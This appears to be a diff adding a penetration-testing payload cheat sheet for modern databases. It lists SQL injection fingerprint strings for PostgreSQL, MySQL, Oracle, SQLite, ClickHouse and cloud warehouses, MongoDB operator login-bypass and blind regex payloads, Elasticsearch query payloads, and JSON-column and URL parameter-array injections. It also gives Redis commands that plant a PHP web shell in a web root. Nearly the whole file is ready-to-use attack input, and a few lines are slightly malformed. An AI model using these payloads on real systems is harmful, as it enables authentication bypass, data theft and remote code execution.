@@ -1,0 +1,82 @@
+# MODERN DBMS + NoSQL + JSON (2026)
+# The boring 4 backends hog the news; modern apps run these. Fingerprint first.
+
+## 0) Fingerprint one-liners (usable on most engines)
+1' AND version()-- -            # PG/MySQL error dump
+1' AND 1=(SELECT 1 FROM dual)-- -   # Oracle (dual) vs MySQL (dual works too)
+1' AND 1=(SELECT 1 FROM pg_tables)-- -   # PG-specific table
+1' AND 1=(SELECT 1 FROM sqlite_master)-- -  # SQLite
+1' AND 1=(SELECT 1 FROM system.one)-- -   # ClickHouse
+SELECT version() - -,             # PG, MySQL, ClickHouse all reply
+
+## 2) NoSQL - MongoDB ($ operators reachable through JSON body / param arrays)
+# Auth bypass
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"user":"admin","password":{"$ne":"anything"}}
+{"id":{"$where":"1==1"}}
+# Blind exfil (timing): id={"$regex":"^a.*"} then play with sleep:
+{"id":{"$regex":"^s.*"}}   # true/false via response content
+{"id":{"$regex":"^(?=s).*$name;sleep(5000)"}}
+# Aggregate cast leak:
+ {"$expr":{"$eq":[{"$toString":"$flag"},"{"]}}
+ db.users.find({$where:"sleep(1000)"})
+# Keyspace discovery via regex on unknown fields:
+{"token":{"$regex":"^[A-Za-z0-9_]*$"}}
+# Err. Note: $where is banned on 4.4+ unless javascriptEnabled; prefer $regex + aggregate pipeline above.
+
+## 3) NoSQL - Elasticsearch (JSON body)
+{"query":{"bool":{"must":[{"match":{"name":1}}]}}}
+{"query":{"range":{"price":{"lte":1}}}}            # 1=1 style
+{"query":{"term":{"category":{"value":"x' OR 1=1"}}}}
+# Script scoring RCE-ish: stored scripts historically hit via 9200 untrusted API.
+# Suggest: always try {"query":{"match_all":{}}} first to distinguish REST-layer.
+
+## 4) NoSQL - Redis (usually 6379, no auth = RCE)
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET x "<?php system($_GET[0]); ?>"
+SAVE
+# Exfil pivot: redis + LUA dofile /evalsha -
+
+## 5) ClickHouse  (system.one is the dual equivalent)
+1' UNION SELECT 'a' FROM system.one-- -
+1' AND (SELECT 1 FROM system.one)=1-- -
+1' AND version()=1-- -
+# Exfil via HTTP interface if reachable (8123):
+SELECT groupArray(name) FROM system.tables
+
+## 6) DuckDB + SQLite (incl. in-browser/CLI PoCs)
+# DuckDB no server by default - only reachable via attached extension; still test id=1 UNION SELECT ...
+# SQLite write-to-webroot via ATTACH? Not native; use UNION + functions:
+' UNION SELECT group_concat(sql) FROM sqlite_master-- -
+' AND (SELECT load_extension('lib_sqlite_regexp'))-- -    # if present -> indexed regex helper
+
+## 7) Snowflake / BigQuery / Redshift / ClickHouse (cloud SQL)
+# Snowflake: id=1' UNION SELECT current_account(),NULL-- -
+# BigQuery: id=1' AND 1=1 (ARRAY_AGG to leak)
+' ; SELECT SESSION_USER()-- -
+# Redshift (PG-ish but no LIMIT in subquery):
+1' AND 1=(SELECT COUNT(*) FROM pg_tables)-- -
+# All cloud DBs: S3/GS creds rarely shared, focus on the business data.
+
+## 8) JSON columns / JSON_TABLE (MySQL 8.0+, PG 12+ jsonb, MSSQL 2016+ JSON)
+' UNION SELECT json_extract(col,'$.a'),NULL FROM t-- -          # MySQL
+' UNION SELECT col->>'a',NULL FROM t-- -                        # PG
+' AND JSON_EXTRACT('{"id":1}','$.id')=1-- -                     # MySQL [email-gold 2026]
+' AND col->'$.a'='1'::jsonb-- -                                 # PG
+# MSSQL 2016+:
+1' AND JSON_VALUE(col,'$.a')=1-- -
+# Array position test (PG): col->1
+
+## 9) SQLite3 numeric vs string nuance
+1' AND '1'='1-- -          # works (coerce)
+1' AND 1=1#                # # comment only in MySQL; sqlite uses --
+# Blind string compare: SUBSTRING(CAST(... AS TEXT),1,1)='x'
+
+## 10) NoSQL parameter-based (PHP arrays / Rails)
+# ?id[0]=1&id[1]=payload  - bypasses some CDNs/regex (JSON/WAF).
+?user[$ne]=1&pass[$ne]=1
+?user[$regex]=^ad
+?id[$gt]=
+# GraphQL introspection calls often sit on top of SQL - see GraphQL/ + NoSQL folders for depth.
